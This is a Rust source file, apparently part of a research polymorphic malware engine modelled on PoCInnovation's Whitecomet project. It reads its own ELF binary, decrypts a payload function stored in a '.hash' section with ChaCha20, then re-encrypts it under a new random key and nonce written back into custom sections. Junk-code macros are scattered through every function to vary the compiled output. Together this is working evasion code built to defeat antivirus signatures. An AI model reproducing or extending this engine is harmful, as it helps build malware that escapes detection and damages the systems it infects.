#![allow(warnings)]
#![feature(asm)]

// https://github.com/PoCInnovation/Whitecomet-Research/
// https://github.com/PoCInnovation/Whitecomet-Research/blob/master/Polymorphic/Linux-ELF/src/main.c

use std::arch::asm;
use std::error::Error;

use rand;
use object::{File, Object, ObjectSection};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};

// modules
use crate::metamorphic;

// Payload function section size
pub const CRYPTED_FUNC_SIZE: usize = 1406;

/// Get ELF sections from specified name.
///
/// # Arguments
///
/// * `file` - Opened file handle
/// * `name` - Section name to retrieve
///
/// # Return value
///
/// Section file offset range.
fn get_section(file: &File, name: &str) -> Option<(u64, u64)> {
    for section in file.sections() {
        metamorphic::junk!();
        match section.name() {
            Ok(n) if n == name => {
                return section.file_range();
            }
            _ => {}
        }
        metamorphic::junk!();
    }
    None
}

/// Decrypt ELF section using key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Decryption key
/// * `nonce` - Decryption nonce
/// * `first` - first run bool
///
/// # Return value
///
/// Decrypted function as int array.
pub fn decrypt_func(code: &mut [u8], key: [u8; 32], nonce: [u8; 12], first: u8) -> Result<[u8; CRYPTED_FUNC_SIZE], Box<dyn Error>> {
    let mut decrypted_func: [u8; CRYPTED_FUNC_SIZE] = [0; CRYPTED_FUNC_SIZE]; metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".hash") {
        // println!("CRYPTED_FUNC_SIZE: {}, {}", CRYPTED_FUNC_SIZE, range.1);
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;
        decrypted_func.copy_from_slice(&code[base..(base+CRYPTED_FUNC_SIZE)]); metamorphic::junk!();

        if first == 0 {
            first_run(code, first); metamorphic::junk!();
        } else {
            // Key and IV must be references to the `GenericArray` type.
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into()); metamorphic::junk!();

            // apply keystream (decrypt)
            cipher.apply_keystream(&mut decrypted_func); metamorphic::junk!();
        }
    }

    Ok(decrypted_func)
}

/// Encrypt function using regenerated key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `decrypted_func` - Decrypted function array
///
/// # Return value
///
/// True if key is regenerated and encrypted function array with key is stored back into memory.
pub fn encrypt_func(code: &mut [u8], decrypted_func: &mut [u8; CRYPTED_FUNC_SIZE]) -> Result<(), Box<dyn Error>> {
    let mut key: [u8; 32] = [0; 32];
    let mut nonce: [u8; 12] = [0; 12];
    generate_key(code, &mut key, &mut nonce).ok(); metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".hash") {
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;

        // Key and IV must be references to the `GenericArray` type.
        let mut cipher = ChaCha20::new(&key.into(), &nonce.into()); metamorphic::junk!();

        // apply keystream (encrypt)
        cipher.apply_keystream(decrypted_func); metamorphic::junk!();

        code[base..(base+CRYPTED_FUNC_SIZE)].copy_from_slice(decrypted_func); metamorphic::junk!();
    }

    Ok(())
}

/// Regenerate key randomly and store back into memory
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Encryption key
/// * `nonce` - Encryption nonce
///
/// # Return value
///
/// True if regenerated key is stored back into memory.
fn generate_key(code: &mut [u8], key: &mut [u8; 32], nonce: &mut [u8; 12]) -> Result<(), Box<dyn Error>> {
    for i in 0..key.len() {
        key[i] = rand::random::<u8>() % 255; metamorphic::junk!();
    }

    for i in 0..nonce.len() {
        nonce[i] = rand::random::<u8>() % 255; metamorphic::junk!();
    }

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".nsp0") {
        assert_eq!(range.1 as usize, key.len()); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+key.len())].copy_from_slice(key); metamorphic::junk!();
    }

    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".nsp1") {
        assert_eq!(range.1 as usize, nonce.len()); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+nonce.len())].copy_from_slice(nonce); metamorphic::junk!();
    }

    Ok(())
}

/// Set first run bool as 1
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `first` - first run bool
///
/// # Return value
///
/// True if bool is set to 1
fn first_run(code: &mut [u8], first: u8) -> Result<(), Box<dyn Error>> {
    let file = File::parse(&*code)?; metamorphic::junk!();

    if let Some(range) = get_section(&file, ".lbss") {
        assert_eq!(range.1, 1); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+1)].copy_from_slice(&(first + 1).to_ne_bytes()); metamorphic::junk!();
    }

    Ok(())
}

